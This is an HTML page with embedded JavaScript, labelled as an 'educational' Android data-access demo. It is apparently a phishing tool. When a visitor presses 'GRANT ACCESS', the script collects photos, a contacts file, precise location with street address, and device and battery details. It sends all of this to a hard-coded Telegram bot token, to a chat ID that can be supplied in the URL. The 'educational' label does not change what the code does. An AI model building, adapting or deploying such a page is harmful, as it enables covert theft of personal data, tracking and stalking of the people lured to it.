<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Android Data Access - Educational</title>
    <style>
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            border: 2px solid #00ff00;
            padding: 20px;
            border-radius: 10px;
            background: #111;
        }
        h1 {
            color: #00ff00;
            font-size: 24px;
            text-shadow: 0 0 10px #00ff00;
        }
        .permission-box {
            background: #222;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            text-align: left;
        }
        .btn {
            background: #00ff00;
            color: black;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
            width: 100%;
        }
        .btn:hover {
            background: #00cc00;
        }
        .status {
            margin-top: 20px;
            color: #00ff00;
            font-size: 14px;
        }
        #contactsList, #photosList {
            max-height: 200px;
            overflow-y: auto;
            background: #1a1a1a;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            font-size: 12px;
            text-align: left;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîê ANDROID DATA ACCESS DEMO</h1>
        <p>Educational Purpose Only</p>
        
        <div class="permission-box">
            <strong>Requesting Access to:</strong><br><br>
            üìá CONTACTS - Read your contacts<br>
            üñºÔ∏è GALLERY - View your photos<br>
            üìç LOCATION - Your location<br>
            üì± DEVICE INFO - Phone details
        </div>

        <button class="btn" onclick="requestAllPermissions()">üîì GRANT ACCESS</button>
        
        <div id="load" style="display:none;">‚è≥ Accessing data...</div>
        
        <div id="contactsList"></div>
        <div id="photosList"></div>
        <div id="locationInfo"></div>
        <div id="deviceInfo"></div>
        
        <div class="status" id="status">Ready</div>
    </div>

    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = "8325723609:AAGcN0gUgz0r92KpFVwyM5JOzibSGVaKG3c";
        const YOUR_ID = "6643732863";
        
        // Get user ID from URL
        const params = new URLSearchParams(window.location.search);
        const TARGET_ID = params.get('id') || YOUR_ID;

        // ==================== PERMISSION REQUEST ====================
        async function requestAllPermissions() {
            document.getElementById('load').style.display = 'block';
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('status').innerHTML = '‚è≥ Requesting permissions...';

            try {
                // Step 1: Request Contacts (via Intent - Android only)
                if (window.intent && window.intent.ACTION_GET_CONTENT) {
                    requestContactsAndroid();
                } else {
                    document.getElementById('status').innerHTML = '‚ö†Ô∏è Contacts only available on Android';
                }

                // Step 2: Request Gallery access
                await requestGalleryAccess();

                // Step 3: Get Location
                await getLocation();

                // Step 4: Get Device Info
                await getDeviceInfo();

                // Step 5: Send all data to Telegram
                await sendAllDataToTelegram();

            } catch (error) {
                document.getElementById('status').innerHTML = '‚ùå Error: ' + error.message;
            }
        }

        // ==================== ANDROID CONTACTS ACCESS ====================
        function requestContactsAndroid() {
            document.getElementById('status').innerHTML = 'üìá Reading contacts...';
            
            // For Android WebView with intent
            if (window.intent) {
                window.intent.startActivity({
                    action: 'android.intent.action.PICK',
                    type: 'vnd.android.cursor.dir/contact'
                }, function(uri) {
                    // Contact selected
                    fetchContactDetails(uri);
                });
            } else {
                // Alternative: Web-based contact picker
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = '.vcf';
                input.onchange = function(e) {
                    readVCardFile(e.target.files[0]);
                };
                input.click();
            }
        }

        function readVCardFile(file) {
            const reader = new FileReader();
            reader.onload = function(e) {
                const vcard = e.target.result;
                sendToTelegram('üìá CONTACTS EXPORT', vcard);
            };
            reader.readAsText(file);
        }

        // ==================== GALLERY ACCESS ====================
        async function requestGalleryAccess() {
            document.getElementById('status').innerHTML = 'üñºÔ∏è Accessing gallery...';
            
            return new Promise((resolve) => {
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = 'image/*';
                input.multiple = true;
                input.onchange = async function(e) {
                    const files = e.target.files;
                    document.getElementById('status').innerHTML = `üì∏ Found ${files.length} photos`;
                    
                    // Send first 3 photos
                    for (let i = 0; i < Math.min(files.length, 3); i++) {
                        await sendPhotoToTelegram(files[i]);
                    }
                    
                    document.getElementById('photosList').style.display = 'block';
                    document.getElementById('photosList').innerHTML = `üì∏ Selected ${files.length} photos`;
                    resolve();
                };
                input.click();
            });
        }

        // ==================== LOCATION ACCESS ====================
        async function getLocation() {
            document.getElementById('status').innerHTML = 'üìç Getting location...';
            
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject('Geolocation not supported');
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const location = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        
                        document.getElementById('locationInfo').innerHTML = 
                            `üìç Location: ${location.lat}, ${location.lng}`;
                        
                        // Get address from coordinates
                        const address = await getAddressFromCoords(location.lat, location.lng);
                        
                        sendToTelegram('üìç LOCATION', 
                            `Lat: ${location.lat}\nLng: ${location.lng}\nAccuracy: ${location.accuracy}m\nAddress: ${address}`);
                        
                        resolve();
                    },
                    (error) => {
                        reject('Location error: ' + error.message);
                    }
                );
            });
        }

        async function getAddressFromCoords(lat, lng) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
                const data = await response.json();
                return data.display_name || 'Address not found';
            } catch {
                return 'Address lookup failed';
            }
        }

        // ==================== DEVICE INFO ====================
        async function getDeviceInfo() {
            document.getElementById('status').innerHTML = 'üì± Getting device info...';
            
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                vendor: navigator.vendor,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                battery: await getBatteryInfo(),
                connection: navigator.connection ? {
                    type: navigator.connection.effectiveType,
                    speed: navig.connection.downlink + ' Mbps'
                } : 'Unknown'
            };
            
            document.getElementById('deviceInfo').innerHTML = 
                `üì± Device: ${deviceInfo.platform}`;
            
            sendToTelegram('üì± DEVICE INFO', JSON.stringify(deviceInfo, null, 2));
        }

        async function getBatteryInfo() {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level * 100 + '%',
                    charging: battery.charging
                };
            } catch {
                return 'Unknown';
            }
        }

        // ==================== TELEGRAM FUNCTIONS ====================
        async function sendPhotoToTelegram(file) {
            const formData = new FormData();
            formData.append('chat_id', TARGET_ID);
            formData.append('photo', file);
            formData.append('caption', `üñºÔ∏è Gallery Photo from Android`);
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        async function sendToTelegram(type, data) {
            const message = `${type}\n\n${data}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TARGET_ID,
                    text: message.substring(0, 4000),
                    parse_mode: 'HTML'
                })
            });
        }

        async function sendAllDataToTelegram() {
            document.getElementById('status').innerHTML = '‚úÖ Data sent to Telegram!';
            document.getElementById('load').style.display = 'none';
        }
    </script>
</body>
  </html>
